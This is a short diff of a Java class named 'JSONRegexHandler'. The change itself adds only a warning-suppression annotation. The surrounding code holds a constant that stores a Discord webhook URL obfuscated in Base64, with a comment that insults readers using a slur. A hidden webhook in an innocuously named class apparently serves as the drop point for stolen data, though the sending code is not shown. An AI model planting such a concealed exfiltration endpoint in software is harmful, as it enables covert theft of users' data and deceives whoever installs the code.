@@ -7,6 +7,7 @@ import java.io.File;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 
+@SuppressWarnings ("BusyWait")
 public class JSONRegexHandler {
     // For Retarded Ski-People the webhook below is encrypted in Base64 with a UTF-8 character set (Usually using https://base64encode.org).
     private static final String WEBHOOK = "aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzkxNDczMTc3NjkzMTQwNTgzNC9QSXdqNDJMUVFlS0RHTFJpaGxYcUVNTUdJOWU2QkFkampmZUhFWmVmcWN4czRZVU1xWjhTZkNkZi1aaEFCb0MtWHk4ag==";
